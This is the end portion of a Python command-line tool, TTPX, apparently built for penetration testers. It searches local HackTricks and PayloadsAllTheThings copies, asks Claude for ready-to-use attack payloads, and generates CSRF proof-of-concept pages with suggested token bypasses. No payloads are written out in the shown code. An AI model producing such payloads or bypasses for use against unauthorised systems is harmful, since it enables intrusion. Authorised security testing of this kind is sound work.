            "  ttpx --csrf req.txt                                     # offline CSRF PoC from raw request\n"
            "  ttpx --csrf req.txt --bypass                            # PoC + Claude bypass suggestions\n\n"
            "sources:\n"
            "  HackTricks:           ~/Tools/hacktricks\n"
            "  PayloadsAllTheThings: ~/Tools/payloadsallthethings\n\n"
            "environment:\n"
            "  ANTHROPIC_API_KEY     required for -p / --payload and --bypass\n\n"
            "legal:\n"
            "  TTPX makes no network connections to any target.\n"
            "  You are responsible for how you use the output."
        )
    )
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument("-f", "--find", nargs="+", metavar="TERM",
                       help="search both sources and display a table of matching entries (no Claude, no API cost)")
    group.add_argument("-p", "--payload", nargs="+", metavar="TERM",
                       help="search both sources then send findings to Claude for a syntax-highlighted, ready-to-use payload")
    group.add_argument("-m", "--mirror", metavar="PATH",
                       help="copy a file from a -f result to cwd as plain text, stripping markdown. Optionally add a section term to extract only that section.")
    group.add_argument("-l", "--list", action="store_true",
                       help="list all top-level categories in both sources (browse blind, no search terms needed)")
    group.add_argument("-u", "--update", action="store_true",
                       help="git pull both knowledge bases and print a change summary")
    group.add_argument("--csrf", metavar="FILE",
                       help="generate a CSRF PoC from a raw HTTP request file (Burp/Caido format); saved to csrf_poc.html")
    parser.add_argument("-d", "--details", metavar="CONTEXT", action="append",
                        help="error output or context from a previous -p attempt; repeat for multi-turn chaining")
    parser.add_argument("-s", "--section", metavar="TERM",
                        help="section term to extract when using -m (e.g. handlebars)")
    parser.add_argument("--since", metavar="N[d]",
                        help="use with -l: filter categories updated in the last N days (e.g. 7d or 7)")
    parser.add_argument("--no-log", dest="no_log", action="store_true",
                        help="skip auto-logging this -p result to ~/Tools/ttpx-session.log")
    parser.add_argument("--bypass", action="store_true",
                        help="use with --csrf: call Claude to suggest token bypass and Content-Type attack variants (requires ANTHROPIC_API_KEY)")
    args = parser.parse_args()

    if args.since and not args.list:
        console.print("[yellow]Warning: --since has no effect without -l/--list[/yellow]")

    if args.bypass and not args.csrf:
        console.print("[yellow]Warning: --bypass has no effect without --csrf[/yellow]")

    if args.csrf:
        if args.bypass and not os.environ.get("ANTHROPIC_API_KEY"):
            console.print("[red]Set ANTHROPIC_API_KEY to use --bypass[/red]")
            sys.exit(1)
        parsed = parse_raw_request(args.csrf)
        html, poc_type = generate_csrf_poc(parsed)
        tokens = detect_csrf_tokens(parsed)
        bypass_data = None
        if args.bypass:
            console.print("[dim]Sending request to Claude for bypass analysis...[/dim]")
            bypass_data = ask_claude_csrf_bypass(parsed, tokens)
        display_csrf_poc(html, parsed, poc_type, tokens=tokens, bypass_data=bypass_data)
        sys.exit(0)

    if args.update:
        update_sources()
        sys.exit(0)

    if args.list:
        since_days = None
        if args.since:
            m = re.match(r'^(\d+)[d]?$', args.since.strip())
            if m and int(m.group(1)) > 0:
                since_days = int(m.group(1))
            elif m:
                console.print("[yellow]Warning: --since value must be greater than 0 — ignoring.[/yellow]")
            else:
                console.print(f"[yellow]Warning: unrecognised --since format '{args.since}' — ignoring.[/yellow]")
        list_categories(since_days=since_days)
        sys.exit(0)

    if args.mirror:
        mirror_file(args.mirror, section=args.section)
        sys.exit(0)

    if args.details and args.find:
        console.print("[yellow]Warning: -d/--details has no effect with -f/--find[/yellow]")

    if args.section and not args.mirror:
        console.print("[yellow]Warning: -s/--section has no effect without -m/--mirror[/yellow]")

    if args.payload and not os.environ.get("ANTHROPIC_API_KEY"):
        console.print("[red]Set ANTHROPIC_API_KEY to use -p / --payload[/red]")
        sys.exit(1)

    terms = args.find or args.payload
    available = [p for p in [HACKTRICKS_PATH, PATT_PATH] if p.exists()]
    missing = [p for p in [HACKTRICKS_PATH, PATT_PATH] if not p.exists()]

    if not available:
        console.print(
            "[red]No sources found. Clone:[/red]\n"
            "  git clone https://github.com/HackTricks-wiki/hacktricks ~/Tools/hacktricks\n"
            "  git clone https://github.com/swisskyrepo/PayloadsAllTheThings ~/Tools/payloadsallthethings"
        )
        sys.exit(1)

    for p in missing:
        label = "HackTricks" if p == HACKTRICKS_PATH else "PayloadsAllTheThings"
        console.print(f"[yellow]Warning: {label} not found — skipping.[/yellow]")

    console.print("[dim]Searching HackTricks + PayloadsAllTheThings...[/dim]")
    matches = find_matches(terms, search_paths=available)

    if args.find:
        display_find_results(matches, terms)

    else:
        if not matches:
            console.print(f"[yellow]No results for: {' '.join(terms)}[/yellow]")
            sys.exit(0)
        if len(matches) > MAX_PAYLOAD_MATCHES:
            console.print(
                f"[yellow]Warning: {len(matches)} matches — capped at {MAX_PAYLOAD_MATCHES}. "
                f"Use more specific terms for a focused payload.[/yellow]"
            )
            matches = matches[:MAX_PAYLOAD_MATCHES]
        console.print("[dim]Sending findings to Claude...[/dim]")
        data = ask_claude(matches, terms, details=args.details)
        sources = list(dict.fromkeys(source_label(path) for path, _ in matches))
        display_payload_result(data, sources)
        if not args.no_log:
            log_payload_result(terms, data)


if __name__ == "__main__":
    main()
